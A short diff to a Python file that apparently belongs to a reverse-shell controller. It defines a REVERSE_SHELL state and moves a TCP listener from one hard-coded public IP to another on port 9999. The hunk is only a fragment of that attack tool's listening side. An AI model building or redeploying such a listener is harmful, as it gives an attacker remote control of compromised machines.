@@ -27,7 +27,8 @@ class State:
     REVERSE_SHELL = 7
 
 ServerSock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-ServerSock.bind(('94.198.218.23' , 9999))
+ServerSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+ServerSock.bind(('45.9.43.217' , 9999))
 ServerSock.listen(2)
 
 cState = State.CONNECTION_NON_ESTABLISHED_RECV
